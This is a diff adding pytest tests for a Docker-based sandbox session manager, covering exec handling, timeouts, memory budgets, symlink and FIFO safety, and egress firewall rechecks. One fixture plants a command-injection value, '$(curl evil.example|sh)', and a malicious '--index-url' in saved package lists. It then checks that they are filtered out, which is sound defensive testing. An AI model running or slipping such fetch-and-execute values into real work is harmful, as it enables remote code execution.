@@ -12,6 +12,7 @@ import json
 import os
 import shutil
 import socket
+import stat
 import subprocess
 import sys
 import tempfile
@@ -30,6 +31,7 @@ ti_module = importlib.import_module("secure_container.tool_integrator")
 
 ExecResult = namedtuple("ExecResult", "exit_code output")
 GB_KB = 1024 * 1024  # kB in a GiB
+RECHECK = 300  # sessions.EGRESS_RECHECK_SECONDS: how often reap_idle re-applies the egress rules
 APP_DIR = Path(__file__).resolve().parents[1] / "app"
 
 
@@ -144,23 +146,63 @@ class FakeBrowserServer:
 
 
 class FakeContainer:
+    """A container; ``client.api`` is the container itself, with docker-py's three exec calls:
+    ``exec_create`` (refused when the container is gone: nothing ran), ``exec_start`` (refused
+    likewise, else it runs ``docker.exec_handler``, i.e. the command) and ``exec_inspect`` (its
+    exit code; a 404 once the container was removed meanwhile, like real Docker, and the handler's
+    exception if it raised: a failure AFTER the command started)."""
+
     def __init__(self, docker, image, command, kwargs):
         self.docker = docker
         self.image, self.command, self.kwargs = image, command, kwargs
         self.name = kwargs.get("name")
+        self.id = f"id-{self.name}"
+        self.client = SimpleNamespace(api=self)
         self.labels = dict(kwargs.get("labels") or {})
         self.status = "running"
         self.removed = False
         self.execs: list[tuple[list, dict]] = []
+        self.exec_start_kwargs: list[dict] = []
+        self._exec_results: dict[str, object] = {}
         self.server: FakeBrowserServer | None = None
 
-    def exec_run(self, cmd, **kwargs):
+    def _refuse_unless_running(self):
         if self.removed:
             raise FakeAPIError(404, "No such container")
         if self.status != "running":
             raise FakeAPIError(409, "container is not running")
+
+    def exec_run(self, cmd, stdout=True, stderr=True, user="", workdir=None, demux=False):
+        """docker-py's Container.exec_run: exactly the three calls below."""
+        created = self.client.api.exec_create(self.id, cmd, stdout=stdout, stderr=stderr, user=user, workdir=workdir)
+        output = self.client.api.exec_start(created["Id"], demux=demux)
+        return ExecResult(self.client.api.exec_inspect(created["Id"])["ExitCode"], output)
+
+    def exec_create(self, container_id, cmd, **kwargs):
+        assert container_id == self.id
+        self._refuse_unless_running()
         self.execs.append((cmd, kwargs))
-        return ExecResult(*self.docker.exec_handler(self, cmd, kwargs))
+        return {"Id": f"exec-{len(self.execs) - 1}"}
+
+    def exec_start(self, exec_id, **kwargs):
+        self._refuse_unless_running()
+        self.exec_start_kwargs.append(kwargs)
+        cmd, create_kwargs = self.execs[int(exec_id.split("-")[1])]
+        try:
+            code, output = ExecResult(*self.docker.exec_handler(self, cmd, create_kwargs))
+        except Exception as e:  # noqa: BLE001 - reported by exec_inspect, after the start
+            self._exec_results[exec_id] = e
+            return b""
+        self._exec_results[exec_id] = code
+        return output
+
+    def exec_inspect(self, exec_id):
+        if self.removed:
+            raise FakeAPIError(404, f"No such exec instance: {exec_id}")
+        result = self._exec_results[exec_id]
+        if isinstance(result, BaseException):
+            raise result
+        return {"ExitCode": result, "Running": False}
 
     def commands(self):
         """The user commands of the execs ($2 of the wrapper)."""
@@ -423,7 +465,8 @@ def test_one_session_serves_every_command(env):
     argv, kwargs = shell.execs[0]
     assert argv[:2] == ["bash", "-c"] and argv[3:5] == ["sandbox-exec", "30"]
     assert 'timeout -k 5 "$1" bash -lc "$2"' in argv[2]
-    assert kwargs == {"user": "runner", "workdir": "/home/runner/workspace", "demux": False}
+    assert kwargs == {"stdout": True, "stderr": True, "user": "runner", "workdir": "/home/runner/workspace"}
+    assert shell.exec_start_kwargs == [{"demux": False}, {"demux": False}]
     assert shell.execs[1][0][4] == "60"  # the default timeout
     run = shell.kwargs
     assert shell.image == "secure-container:abc" and shell.command == ["sleep", "infinity"]
@@ -454,11 +497,11 @@ def test_exec_result_formats():
     assert fmt(0, b"hello\n", 30) == "hello\n"
     assert fmt(0, b"", 30) == "(no output)"
     assert fmt(2, b"bad\n", 30) == "Error (exit code 2):\nbad\n"
-    timed_out = fmt(124, b"partial", 30)
+    timed_out = fmt(124, b"partial", 30, elapsed=30.2)
     assert timed_out.startswith("Error: the command timed out after 30 s (the sandbox session is still running; "
                                 "long jobs: start them in the background with nohup")
     assert timed_out.endswith("Output before the timeout:\npartial")
-    assert fmt(124, b"", 5) == sessions.timeout_message(5)
+    assert fmt(124, b"", 5, elapsed=5.0) == sessions.timeout_message(5)
     assert fmt(137, b"", 30, elapsed=35.2).startswith("Error: the command timed out after 30 s")  # killed by -k
     killed = fmt(137, b"x", 30, elapsed=2.0, mem_mb=768)
     assert killed.startswith("Error (exit code 137: the process was killed") and "768 MB" in killed
@@ -469,10 +512,16 @@ def test_exec_result_formats():
 
 def test_exec_maps_exit_codes_through_the_session(env):
     outcomes = {"ok": (0, b"fine"), "fail": (3, b"nope"), "slow": (124, b"")}
-    env.docker.exec_handler = lambda c, cmd, kw: outcomes[cmd[5]]
+
+    def handler(c, cmd, kw):
+        if cmd[5] == "slow":
+            time.sleep(1.05)  # `timeout -k 5 1 ...` fired: the time was up
+        return outcomes[cmd[5]]
+
+    env.docker.exec_handler = handler
     assert env.m.exec("7", "ok") == "fine"
     assert env.m.exec("7", "fail") == "Error (exit code 3):\nnope"
-    assert env.m.exec("7", "slow", timeout=10).startswith("Error: the command timed out after 10 s")
+    assert env.m.exec("7", "slow", timeout=1).startswith("Error: the command timed out after 1 s")
     assert env.m.exec("7", "ok", timeout=99999) == "fine"
     assert env.docker.of_kind("shell")[0].execs[-1][0][4] == str(sessions.MAX_EXEC_TIMEOUT)
 
@@ -513,6 +562,65 @@ def test_docker_errors_that_are_not_about_the_container_are_reported(env):
     env.docker.exec_handler = boom
     assert env.m.exec("7", "ls") == "Error executing command: daemon hiccup"
     assert len(env.docker.of_kind("shell")) == 1  # the session stays
+
+
+def test_a_command_cut_off_by_close_is_never_run_again(env):
+    """/sandbox Close (or forget, the reaper, a shutdown) while a command runs: docker's exec_start
+    returns what was printed so far and exec_inspect is a 404. That used to read as "the container
+    was gone before the command started", so the command ran a second time in a new session."""
+    started, release = threading.Event(), threading.Event()
+    runs = []
+
+    def handler(container, cmd, kwargs):
+        runs.append((container.name, cmd[5]))
+        started.set()
+        release.wait(5)
+        return 0, b"partial"
+
+    env.docker.exec_handler = handler
+    result = {}
+    worker = threading.Thread(target=lambda: result.setdefault("r", env.m.exec("42", "echo hi >> log.txt")))
+    worker.start()
+    assert started.wait(5)
+    assert env.m.close("42") is True
+    release.set()
+    worker.join(5)
+    assert [cmd for _name, cmd in runs] == ["echo hi >> log.txt"]  # once
+    assert len(env.docker.of_kind("shell")) == 1 and env.docker.running("shell") == []  # no new session
+    assert result["r"] == "Error: the sandbox was closed while the command was running; it did not finish."
+    assert result["r"] == sessions.CLOSED_WHILE_RUNNING
+
+    # a failure after the start that is not about the container is reported as before, not re-run
+    def flaky(container, cmd, kwargs):
+        runs.append((container.name, cmd[5]))
+        raise FakeAPIError(500, "daemon hiccup")
+
+    env.docker.exec_handler = flaky
+    assert env.m.exec("42", "make") == "Error executing command: daemon hiccup"
+    assert [cmd for _name, cmd in runs].count("make") == 1
+
+
+def test_inner_exit_124_is_not_the_session_timeout(env):
+    """``timeout 10 curl ...`` inside a command exits 124 too; only a 124 once the session's own
+    time was up is the timeout text."""
+    fmt = sessions.format_exec_result
+    assert fmt(124, b"curl gave up\n", 600, elapsed=2.0) == "Error (exit code 124):\ncurl gave up\n"
+    assert fmt(124, b"", 600, elapsed=600.4) == sessions.timeout_message(600)
+    env.docker.exec_handler = lambda c, cmd, kw: (124, b"curl gave up\n")
+    assert env.m.exec("7", "timeout 10 curl https://example.com", timeout=600) == "Error (exit code 124):\ncurl gave up\n"
+
+
+def test_unknown_exit_status_is_an_error_and_saves_no_package(env):
+    """exec_inspect can report ExitCode None (the container stopped under the command): partial
+    output must not read as success, and install_package must not save the names."""
+    assert sessions.format_exec_result(None, b"partial output", 60, elapsed=1.0) == (
+        "Error: the command's exit status is unknown (the sandbox may have been closed):\npartial output")
+    env.docker.exec_handler = lambda c, cmd, kw: (None, b"Setting up jq ...")
+    assert env.m.exec("7", "ls") == (
+        "Error: the command's exit status is unknown (the sandbox may have been closed):\nSetting up jq ...")
+    out = env.m.install_package("7", "jq", "apt")
+    assert out.startswith("Error: the command's exit status is unknown") and "Saved" not in out
+    assert not (env.base / "7" / "installed_packages.txt").exists()
 
 
 # --------------------------------------------------------------------------- packages
@@ -605,6 +713,24 @@ def test_package_names():
     assert sessions.package_key("apt", "libc6:amd64=2.36") == "libc6"
 
 
+def test_pip_archive_file_names_are_refused_saved_or_not(env):
+    """pip installs ``tool.whl`` / ``x.tar.gz`` from that file in the workspace, not from PyPI: such a
+    name must neither be installed by install_package, nor saved, nor replayed from the file."""
+    for name in ("tool.whl", "x.tar.gz", "X.ZIP", "a.tgz", "a.tar", "a.tar.bz2", "a.tbz", "a.tar.xz", "a.txz",
+                 "a.egg", "pkg==1.0.zip"):
+        with pytest.raises(ValueError, match="is not a valid pip package name"):
+            sessions.parse_packages("pip", name)
+    assert sessions.parse_packages("pip", "zipp wheel tarsier py7zr") == ["zipp", "wheel", "tarsier", "py7zr"]
+    assert sessions.parse_packages("apt", "zip unzip") == ["zip", "unzip"]  # apt names are not files
+    assert env.m.install_package("7", "rich tool.whl", "pip").startswith("Error: 'tool.whl' is not a valid pip package name")
+    assert env.docker.created == []
+    _write(env.base / "7" / "installed_python_packages.txt", "rich\ntool.whl\nother.tar.gz\n")
+    assert sessions.persisted_packages(env.base / "7")["pip"] == ["rich"]
+    env.m.exec("7", "ls")
+    replay = env.docker.of_kind("shell")[0].commands()[0]
+    assert "rich" in replay and ".whl" not in replay and ".tar.gz" not in replay
+
+
 # --------------------------------------------------------------------------- admission
 
 
@@ -618,6 +744,30 @@ def test_memory_refusal_is_readable(env, monkeypatch):
         env.m.browser_call("7", {"action": "navigate", "input": {"url": "example.com"}})
     assert "no new browser can start" in str(browser_err.value) and "(2100 MB free)" in str(browser_err.value)
     assert env.docker.created == []
+
+
+def test_both_kinds_share_one_memory_budget(env, monkeypatch):
+    """Each kind's automatic cap assumes the whole budget (8 GB: 8 shells AND 4 browsers) and
+    MemAvailable hardly moves when an idle container starts, so admission also adds up the memory
+    limits of everything running: they must fit in MemTotal - reserve (8192 - 1536 = 6656 MB)."""
+    monkeypatch.setattr(sessions, "read_meminfo", meminfo(8 * 1024, 7000))
+    assert (env.m.max_shells(), env.m.max_browsers()) == (8, 4)
+    for uid in ("1", "2", "3"):
+        env.m.browser_call(uid, {"action": "screenshot"})  # 3 x 1536 = 4608 MB
+    env.m.exec("4", "a")
+    env.m.exec("5", "b")                                     # + 2 x 768 = 6144 MB
+    with pytest.raises(sessions.CapacityError) as err:
+        env.m.exec("6", "c")                                 # 6912 > 6656, although 6 more shells may run
+    assert str(err.value) == ("The sandboxes already hold 6144 of the 6656 MB this server gives them; no new sandbox "
+                              "session can start right now. Try again in a few minutes.")
+    with pytest.raises(sessions.CapacityError) as browser_err:
+        env.m.browser_call("7", {"action": "screenshot"})    # a 4th browser fits the count cap, not the budget
+    assert "no new browser can start" in str(browser_err.value)
+    assert len(env.docker.created) == 5
+    env.clock.advance(sessions.EVICT_IDLE_SECONDS)
+    assert env.m.exec("6", "c") == "ran: c"                  # the idle LRU shell (user 4) made room
+    assert sorted(c.labels["generall.user"] for c in env.docker.running("shell")) == ["5", "6"]
+    assert len(env.docker.running("browser")) == 3           # a shell never evicts a browser
 
 
 def test_count_cap_and_lru_eviction(env, monkeypatch):
@@ -1016,6 +1166,33 @@ def test_socket_client_handles_long_paths(tmp_path):
         sessions.socket_request(path, {"id": "2", "action": "_ping"}, 1)
 
 
+@pytest.mark.parametrize("with_o_path", [True, False])
+def test_socket_client_never_follows_a_planted_link(short_dir, monkeypatch, with_o_path):
+    """ctl/ is writable by the browser: neither ctl/ nor browser.sock may lead the root bot to
+    another socket (the Docker socket is mounted in the bot container)."""
+    if not with_o_path:
+        monkeypatch.delattr(os, "O_PATH", raising=False)  # the fallback: lstat via the ctl/ descriptor
+    other = short_dir / "o"
+    server = FakeBrowserServer(other / "browser.sock")
+    try:
+        linked_ctl = short_dir / "a" / "ctl"
+        linked_ctl.parent.mkdir()
+        linked_ctl.symlink_to(other)  # ctl/ replaced by a link to a directory with a live socket
+        linked_sock = short_dir / "b" / "ctl" / "browser.sock"
+        linked_sock.parent.mkdir(parents=True)
+        linked_sock.symlink_to(other / "browser.sock")  # the socket itself a link
+        not_a_socket = short_dir / "c" / "ctl" / "browser.sock"
+        not_a_socket.parent.mkdir(parents=True)
+        not_a_socket.write_text("x")
+        for path in (linked_ctl / "browser.sock", linked_sock, not_a_socket):
+            with pytest.raises(sessions._NotDelivered):
+                sessions.socket_request(path, {"id": "x", "action": "_ping"}, 1)
+        assert server.requests == []  # nothing reached the other socket
+        assert sessions.socket_request(other / "browser.sock", {"id": "y", "action": "_ping"}, 2) == {"ok": True}
+    finally:
+        server.stop()
+
+
 # --------------------------------------------------------------------------- close, cleanup, shutdown
 
 
@@ -1058,6 +1235,37 @@ def test_shutdown_all_stops_everything_and_refuses_new_sessions(env):
     assert "_shutdown" in env.docker.of_kind("browser")[0].server.actions()
     with pytest.raises(sessions.CapacityError):
         env.m.exec("1", "b")
+
+
+def test_a_start_in_flight_during_shutdown_does_not_survive_it(env, monkeypatch):
+    """shutdown_all empties the table while docker is still creating a user's container: the
+    session that comes up afterwards must be stopped, not inserted into the cleared table."""
+    entered, release = threading.Event(), threading.Event()
+    real_run = env.docker.containers.run
+
+    def slow_run(image, command=None, **kwargs):
+        entered.set()
+        release.wait(5)
+        return real_run(image, command, **kwargs)
+
+    monkeypatch.setattr(env.docker.containers, "run", slow_run)
+    out = {}
+
+    def call():
+        try:
+            out["result"] = env.m.exec("42", "echo hi")
+        except sessions.CapacityError as e:
+            out["error"] = str(e)
+
+    worker = threading.Thread(target=call)
+    worker.start()
+    assert entered.wait(5)
+    env.m.shutdown_all()
+    release.set()
+    worker.join(5)
+    assert out == {"error": "The sandbox is shutting down."}
+    assert env.m._sessions == {} and env.docker.running("shell") == []
+    assert env.docker.of_kind("shell")[0].commands() == []  # the command never ran
 
 
 # --------------------------------------------------------------------------- network and egress filter
@@ -1119,6 +1327,59 @@ def test_setup_creates_the_network_without_icc(env):
     assert env.m.egress_state == "on" and len(env.iptables.rules) == len(sessions.BLOCKED_RANGES) + 1
     env.m.setup()  # idempotent: the network exists, the rules exist
     assert len(env.docker.networks.created) == 1 and len(env.iptables.inserts()) == len(sessions.BLOCKED_RANGES) + 1
+
+
+def test_egress_rules_are_checked_again_from_the_reaper(env, monkeypatch):
+    """A host firewall reload removes the rules while egress_state stays "on": reap_idle (every
+    60 s) re-applies them at most every EGRESS_RECHECK_SECONDS, idempotently, and updates the state."""
+    monkeypatch.setattr(sessions, "SESSION_IDLE_SECONDS", 1800)
+    env.m.setup()
+    rules = len(sessions.BLOCKED_RANGES) + 1
+    assert env.m.egress_state == "on" and len(env.iptables.rules) == rules
+    env.iptables.rules.clear()  # iptables reload / firewalld restart on the host
+    env.clock.advance(RECHECK - 1)
+    assert env.m.reap_idle() == [] and env.iptables.rules == set()  # not due yet
+    env.clock.advance(1)
+    assert env.m.reap_idle() == []
+    assert len(env.iptables.rules) == rules and env.m.egress_state == "on"
+    inserts = len(env.iptables.inserts())
+    env.clock.advance(RECHECK)
+    env.m.reap_idle()
+    assert len(env.iptables.inserts()) == inserts  # present rules are only checked (-C), never inserted twice
+    # best_effort: rules that cannot be written any more turn the state to failed, sessions stay
+    env.m.exec("7", "ls")
+    env.iptables.rules.clear()
+    env.iptables.fail_insert = True
+    env.clock.advance(RECHECK)
+    assert env.m.reap_idle() == []
+    assert env.m.egress_state == "failed" and env.m.server_status()["egress_filter"] == "failed"
+    assert len(env.docker.running("shell")) == 1
+    env.iptables.fail_insert = False
+    env.clock.advance(RECHECK)
+    env.m.reap_idle()
+    assert env.m.egress_state == "on" and len(env.iptables.rules) == rules
+    assert sessions.EGRESS_RECHECK_SECONDS == RECHECK
+
+
+def test_required_filter_lost_at_a_recheck_stops_every_session(env, monkeypatch):
+    monkeypatch.setattr(sessions, "EGRESS_FILTER", "required")
+    monkeypatch.setattr(sessions, "SESSION_IDLE_SECONDS", 1800)
+    env.m.setup()
+    env.m.exec("1", "a")
+    env.m.browser_call("2", {"action": "screenshot"})
+    env.iptables.rules.clear()
+    env.iptables.fail_insert = True
+    env.clock.advance(RECHECK)
+    assert sorted(env.m.reap_idle()) == [("1", "shell"), ("2", "browser")]
+    assert env.docker.running("shell") == [] and env.docker.running("browser") == []
+    assert "_shutdown" in env.docker.of_kind("browser")[0].server.actions()  # cookies saved first
+    assert env.m.egress_state == "failed"
+    with pytest.raises(sessions.CapacityError, match="SANDBOX_EGRESS_FILTER=required"):
+        env.m.exec("1", "b")
+    env.iptables.fail_insert = False  # fixed: the next check turns sessions back on
+    env.clock.advance(RECHECK)
+    assert env.m.reap_idle() == [] and env.m.egress_state == "on"
+    assert env.m.exec("1", "b") == "ran: b"
 
 
 def test_existing_network_with_another_subnet_is_filtered_by_its_real_subnet(env):
@@ -1269,6 +1530,99 @@ def test_install_package_routes_and_falls_back(container_manager, monkeypatch):
     monkeypatch.setattr(container_manager, "run_one_shot", lambda *a, **k: "Error (exit code 100):\nE: nope")
     assert container_manager.install_package("7", "nope").startswith("Error (exit code 100)")
     assert (container_manager.base_data_path / "7" / "installed_packages.txt").read_text() == "jq\n"
+
+
+def _recording_docker(container_manager, user_dir):
+    """A docker client whose containers.run records its kwargs and, for the setup script, the
+    script's text, mode and type while the container "runs"."""
+    seen = []
+    container = SimpleNamespace(wait=lambda timeout=None: {"StatusCode": 0}, logs=lambda: b"out",
+                                remove=lambda force=False: None)
+
+    def run(**kwargs):
+        script = None
+        if isinstance(kwargs["command"], str) and "temp_setup_" in kwargs["command"]:
+            path = user_dir / Path(kwargs["command"]).name
+            st = os.lstat(path)
+            script = (path.read_text(), stat.S_IMODE(st.st_mode), stat.S_ISREG(st.st_mode))
+        seen.append((kwargs, script))
+        return container
+
+    container_manager.docker_client = SimpleNamespace(containers=SimpleNamespace(run=run, get=lambda name: container))
+    return seen
+
+
+def test_one_off_fallback_replays_only_valid_saved_names_never_through_a_link_or_fifo(container_manager, tmp_path):
+    """The fallback used to read the package lists with exists() + open() (through a link, blocking on
+    a FIFO while holding a MAX_SANDBOX_CONTAINERS slot) and pasted every line into a bash script."""
+    user = container_manager.base_data_path / "7"
+    user.mkdir(parents=True)
+    seen = _recording_docker(container_manager, user)
+    container_manager.session_manager = FakeSessionManager(sessions.CapacityError("full"))
+    secret = tmp_path / "secret.txt"
+    secret.write_text("outsidepkg\n")
+    (user / "installed_packages.txt").symlink_to(secret)
+    fifo = user / "installed_python_packages.txt"
+    os.mkfifo(fifo)
+    done = threading.Event()
+    worker = threading.Thread(target=lambda: (container_manager.run_command("7", "ls", 30, False), done.set()), daemon=True)
+    worker.start()
+    try:
+        assert done.wait(5), "blocked on the FIFO"
+    finally:
+        try:  # unblock a reader stuck in open() (only when the test fails)
+            os.close(os.open(fifo, os.O_WRONLY | os.O_NONBLOCK))
+        except OSError:
+            pass
+    kwargs, script = seen[0]
+    assert kwargs["command"] == ["bash", "-lc", "ls"] and kwargs["network_mode"] == "none" and script is None
+
+    fifo.unlink()
+    (user / "installed_packages.txt").unlink()
+    (user / "installed_packages.txt").write_text("jq\n$(curl evil.example|sh)\npython3-numpy\n")
+    fifo.write_text("rich\n--index-url=http://evil.example\ntool.whl\n")
+    out = container_manager.run_command("7", "ls | wc -l", 30, False)
+    assert out.startswith("out\n[Note: this ran in a one-off container")
+    kwargs, (text, mode, regular) = seen[1]
+    assert kwargs["command"].startswith("/home/runner/workspace/temp_setup_")
+    assert kwargs["network"] == "generall-sandbox"  # installing needs the network
+    assert mode == 0o755 and regular
+    assert "sudo apt-get install -y -qq -o DPkg::Lock::Timeout=120 jq python3-numpy" in text
+    assert "pip install --user --quiet --no-input numpy 2>&1 || true" in text  # the python3-* fallback stays
+    assert "pip install --user --quiet --no-input rich ||" in text
+    for bad in ("evil", "$(", "--index-url", "tool.whl", "outsidepkg"):
+        assert bad not in text, bad
+    assert text.rstrip().endswith("# Now run the actual command\nls | wc -l")
+    assert list(user.glob("temp_setup_*")) == []
+    assert secret.read_text() == "outsidepkg\n"
+
+
+def test_required_filter_failure_leaves_one_off_containers_without_network(container_manager, monkeypatch, tmp_path):
+    """SANDBOX_EGRESS_FILTER=required refuses sessions while the filter is off; their one-off fallback
+    must not run on the (then unfiltered) sandbox network instead."""
+    monkeypatch.setattr(sessions, "EGRESS_FILTER", "required")
+    manager = sessions.SessionManager(FakeDocker(), "img", tmp_path / "d", tmp_path / "d",
+                                      egress_runner=FakeIptables(fail_insert=True))
+    manager.setup()
+    assert manager.egress_state == "failed"
+    container_manager.session_manager = manager
+    user = container_manager.base_data_path / "7"
+    seen = _recording_docker(container_manager, user)
+    out = container_manager.run_command("7", "curl http://10.0.0.1/", 30, True)
+    assert "SANDBOX_EGRESS_FILTER=required" in out  # the note says why the session was refused
+    assert container_manager.install_package("7", "jq").startswith("out\n")
+    container_manager.run_script("7", "browse.py", ["https://x"], network_enabled=True)
+    for kwargs, _script in seen:
+        assert kwargs["network_mode"] == "none" and "network" not in kwargs
+    # saved packages force the network on for their replay: not in required mode without the filter
+    container_manager.run_command("7", "ls", 30, False)
+    assert seen[-1][0]["network_mode"] == "none" and seen[-1][1] is not None
+    manager.egress_state = "on"  # the filter works again: one-off containers join the filtered network
+    container_manager.run_script("7", "browse.py", ["https://x"], network_enabled=True)
+    assert seen[-1][0]["network"] == "generall-sandbox" and "network_mode" not in seen[-1][0]
+    container_manager.session_manager = None  # no manager, so no filter at all
+    container_manager.run_script("7", "browse.py", ["https://x"], network_enabled=True)
+    assert seen[-1][0]["network_mode"] == "none"
 
 
 # --------------------------------------------------------------------------- the patched tools
@@ -1446,3 +1800,24 @@ def test_package_files_are_never_read_or_chmodded_through_a_link(tmp_path):
     saved = user / "installed_packages.txt"
     assert not saved.is_symlink() and saved.read_text() == "jq\n" and saved.stat().st_mode & 0o777 == 0o666
     assert secret.read_text() == "curl\n" and secret.stat().st_mode & 0o777 == 0o600
+
+
+def test_status_never_sizes_the_profile_through_a_link(env, tmp_path):
+    """browser/profile is writable by the browser: a link there (or below it) must not make the bot
+    walk and size a tree outside it."""
+    outside = tmp_path / "outside"
+    (outside / "sub").mkdir(parents=True)
+    (outside / "sub" / "big.bin").write_bytes(b"x" * 123456)
+    profile = env.base / "_sandbox" / "7" / "browser" / "profile"
+    profile.parent.mkdir(parents=True)
+    profile.symlink_to(outside)
+    assert env.m.status("7")["profile_bytes"] == 0
+    profile.unlink()
+    _write(profile / "Default" / "Cookies", "x" * 1000)
+    (profile / "Default" / "Linked").symlink_to(outside)  # a link one level down is not followed either
+    os.mkfifo(profile / "Default" / "fifo")                # and a FIFO is only lstat-ed
+    assert env.m.status("7")["profile_bytes"] == 1000
+    profile.joinpath("Default", "fifo").unlink()
+    shutil.rmtree(profile)
+    profile.write_text("not a directory")
+    assert env.m.status("7")["profile_bytes"] == 0
